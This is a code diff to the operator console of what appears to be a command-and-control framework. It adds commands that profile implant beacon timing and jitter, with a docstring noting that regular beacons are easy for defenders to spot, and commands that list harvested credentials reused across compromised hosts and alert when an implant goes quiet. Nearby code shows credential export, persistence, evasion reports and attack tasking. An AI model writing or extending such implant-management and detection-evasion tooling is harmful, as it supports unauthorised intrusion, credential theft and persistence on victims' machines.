@@ -1396,9 +1396,143 @@ def run_search(client: OperatorClient, console: Console, args: Any) -> int:
     return 0
 
 
+def run_rhythm(client: OperatorClient, console: Console, args: Any) -> int:
+    """How the beacons breathe.
+
+    An implant calls home on a clock somebody set; the rhythm says the
+    shape of what it actually does — the mean, the spread, and a name
+    for the shape.  A beacon that calls home like a metronome is a
+    beacon a watcher can set a clock by, so the fleet list puts the
+    clocks first.
+    """
+    if args.agent:
+        payload = client.rhythm_get(args.agent)
+        if args.json:
+            emit(payload)
+        else:
+            shape = payload.get("shape", "?")
+            beats = payload.get("beats", 0)
+            print(f"{payload.get('agent_id', args.agent)}: {shape}"
+                  f" ({beats} beats)")
+            if beats and beats >= 4:
+                mean = payload.get("interval_ms", 0) / 1000
+                spread = payload.get("spread_ms", 0) / 1000
+                cv = payload.get("cv", 0) / 10
+                print(f"  the pauses: {mean:.1f}s give or take {spread:.2f}s"
+                      f" (cv {cv:.1f}%)")
+                print(f"  the extremes: {payload.get('shortest_ms', 0)} ms to"
+                      f" {payload.get('longest_ms', 0)} ms")
+                print(f"  the next call of home is expected around"
+                      f" {payload.get('eta', '?')}")
+                wanted = payload.get("sleep", 0)
+                jitter = payload.get("jitter", 0)
+                if wanted:
+                    print(f"  the plan was sleep {wanted}s with"
+                          f" {jitter}% jitter; above is what the wire saw")
+            elif beats:
+                print("  too young for a shape: come back after"
+                      " a few more check-ins")
+        return 0
+    payload = client.rhythm_fleet()
+    if args.json:
+        emit(payload)
+        return 0
+    rows = payload.get("fleet") or []
+    if not rows:
+        print("nobody has called home recently enough to have a shape")
+        return 0
+    print(f"{len(rows)} hosts, clocks first")
+    for row in rows:
+        beats = row.get("beats", 0)
+        if beats >= 4:
+            mean = row.get("interval_ms", 0) / 1000
+            print(f"  {row.get('agent_id', '?'):<18} {row.get('shape', '?'):<13}"
+                  f"  {mean:>7.1f}s mean  cv {row.get('cv', 0) / 10:.1f}%"
+                  f"  ({beats} beats)")
+        else:
+            print(f"  {row.get('agent_id', '?'):<18} {row.get('shape', '?'):<13}"
+                  f"  {'':>7}  {'':>11}  ({beats} beats)")
+    return 0
+
+
+def run_creds_reuse(client: OperatorClient, console: Console, args: Any) -> int:
+    """The secrets that serve on more than one host.
+
+    The vault keeps the digest of every material, so the reuse of a
+    password is provable without the password leaving the vault: two
+    hosts, one digest, one key somebody should rotate.
+    """
+    payload = client.creds_reuse()
+    if args.json:
+        emit(payload)
+        return 0
+    groups = payload.get("groups") or []
+    if not groups:
+        print("no secret opens more than one door")
+        return 0
+    print(f"{len(groups)} keys open more than one door")
+    for group in groups:
+        hosts = ", ".join(group.get("hosts") or [])
+        accounts = ", ".join(group.get("accounts") or []) or "-"
+        targets = ", ".join(group.get("targets") or []) or "-"
+        print(f"  {group.get('digest', '?')}  {group.get('kind', '?'):<9}"
+              f"  x{group.get('count', 0)}")
+        print(f"     hosts:    {hosts}")
+        print(f"     accounts: {accounts}")
+        print(f"     targets:  {targets}")
+    return 0
+
+
+def run_silence(client: OperatorClient, console: Console, args: Any) -> int:
+    """The watches of the silences: the news of nothing.
+
+    The alarms of the day fire when something happens; a host that went
+    quiet does nothing, and nothing fires no alarm.  The watch turns the
+    nothing into an `agent.silent` event, so the consoles and the wires
+    learn of it the way they learn of everything.
+    """
+    action = getattr(args, "silence_cmd", "") or "list"
+    if action == "list":
+        payload = client.silence_list()
+        if args.json:
+            emit(payload)
+        else:
+            rows = payload.get("watches") or []
+            if not rows:
+                print("no silences are watched")
+                return 0
+            print(f"{len(rows)} watches")
+            for row in rows:
+                quiet = row.get("quiet_for")
+                live = f"quiet for {quiet}s" if quiet is not None else "unseen"
+                fired = f"  spoke at {row.get('last_fired')}" \
+                    if row.get("last_fired") else ""
+                print(f"  {row.get('id', '?'):<8} {row.get('agent_id', '?'):<18}"
+                      f"  pause {row.get('seconds', '?')}s"
+                      f"  every {row.get('cooldown', '?')}s  {live}{fired}")
+        return 0
+    if action == "add":
+        payload = client.silence_add(args.agent, args.seconds, args.cooldown)
+        if args.json:
+            emit(payload)
+        else:
+            print(f"the watch {payload.get('id')} is promised:"
+                  f" if {payload.get('agent_id')} is quiet for"
+                  f" {payload.get('seconds')}s, the word is said")
+        return 0
+    if action == "remove":
+        payload = client.silence_remove(args.id)
+        if args.json:
+            emit(payload)
+        else:
+            print(f"the watch {payload.get('id')} is forgotten")
+        return 0
+    print(f"unknown silence command: {action}", file=sys.stderr)
+    return 2
+
+
 def run_dossier(client: OperatorClient, console: Console, args: Any) -> int:
     """The file of a host: what the server knows and what it did.
-
     The dossier is one page: the identity, the health, the work, the
     persistence, the tripwires and the requests.  What is not known is
     said as well, because an operator who does not know that is a
@@ -4290,6 +4424,39 @@ def build_parser() -> argparse.ArgumentParser:
     creds_export.add_argument("--kind", default="")
     creds_export.add_argument("--query", default="")
 
+    creds_reuse = sub.add_parser(
+        "creds-reuse",
+        help="the secrets that serve on more than one host")
+    creds_reuse.add_argument("--json", action="store_true")
+
+    rhythm_cmd = sub.add_parser(
+        "rhythm",
+        help="how the beacons breathe: the shape of the check-ins")
+    rhythm_cmd.add_argument("agent", nargs="?", default="",
+                            help="one host; without one, the fleet")
+    rhythm_cmd.add_argument("--json", action="store_true")
+
+    silence_cmd = sub.add_parser(
+        "silence",
+        help="the watches of the silences: the news of nothing")
+    silence_sub = silence_cmd.add_subparsers(dest="silence_cmd")
+
+    silence_list = silence_sub.add_parser("list", help="the watches")
+    silence_list.add_argument("--json", action="store_true")
+
+    silence_add = silence_sub.add_parser(
+        "add", help="promise to worry about a quiet host")
+    silence_add.add_argument("agent")
+    silence_add.add_argument("--seconds", type=int, required=True,
+                             help="the pause that becomes news (5..604800)")
+    silence_add.add_argument("--cooldown", type=int, default=0,
+                             help="how long a fired watch holds its peace")
+    silence_add.add_argument("--json", action="store_true")
+
+    silence_remove = silence_sub.add_parser("remove", help="forget a watch")
+    silence_remove.add_argument("id")
+    silence_remove.add_argument("--json", action="store_true")
+
     persist_list = sub.add_parser("persist-list",
                                   help="what is installed on an agent")
     persist_list.add_argument("agent")
@@ -4949,6 +5116,10 @@ def main(argv: Optional[List[str]] = None) -> int:
             return run_attack(client, console, args)
         elif args.cmd == "search":
             return run_search(client, console, args)
+        elif args.cmd == "rhythm":
+            return run_rhythm(client, console, args)
+        elif args.cmd == "silence":
+            return run_silence(client, console, args)
         elif args.cmd == "baseline":
             return run_baseline(client, console, args)
         elif args.cmd == "otp":
@@ -5747,6 +5918,8 @@ def main(argv: Optional[List[str]] = None) -> int:
             print_credentials(
                 client.creds_export(args.agent, args.kind, args.query),
                 args.json, with_secrets=True)
+        elif args.cmd == "creds-reuse":
+            return run_creds_reuse(client, console, args)
         elif args.cmd == "evade-report":
             if args.agent:
                 run_task_and_wait(client, console, args.agent, "evade.report", {},
